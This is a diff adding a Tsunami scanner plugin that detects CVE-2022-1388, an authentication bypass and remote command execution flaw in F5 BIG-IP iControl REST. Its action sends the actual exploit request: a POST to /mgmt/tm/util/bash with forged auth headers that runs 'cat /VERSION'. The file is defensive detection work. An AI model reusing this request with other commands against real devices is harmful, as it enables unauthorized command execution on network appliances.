@@ -1,0 +1,66 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "CVE20221388VulnDetector"
+  author: "hh-hunter"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "CVE_2022_1388"
+  }
+  severity: CRITICAL
+  title: "CVE-2022-1388 F5 BIG-IP iControl REST Auth Bypass RCE"
+  description: "On F5 BIG-IP 16.1.x versions prior to 16.1.2.2, 15.1.x versions prior to 15.1.5.1, 14.1.x versions prior to 14.1.4.6, 13.1.x versions prior to 13.1.5, and all 12.1.x and 11.6.x versions, undisclosed requests may bypass iControl REST authentication."
+  recommendation: "Update the BIG-IP installation to a version that provides a fix (17.0.0, 16.1.2.2, 15.1.5.1, 14.1.4.6 or 13.1.5) or implement the recommended mitigation measures to protect the affected devices/modules, Blocking iControl REST access through the self IP address, Blocking iControl REST access through the management interface,Modifying the BIG-IP httpd configuration"
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2022-1388"
+  }
+}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "check_icontrol_rest_auth_bypass"
+  http_request: {
+    method: POST
+    uri: "/mgmt/tm/util/bash"
+    headers: [
+      { name: "Authorization" value: "Basic YWRtaW46" },
+      { name: "Connection" value: "keep-alive, X-F5-Auth-Token" },
+      { name: "X-F5-Auth-Token" value: "TSUNAMI_SCANNER" },
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"command\":\"run\",\"utilCmdArgs\":\"-c 'cat /VERSION'\"}"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "tm:util:bash:runstate" },
+          { body: {} contains: "commandResult" }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "check_icontrol_rest_auth_bypass"
+  ]
+}
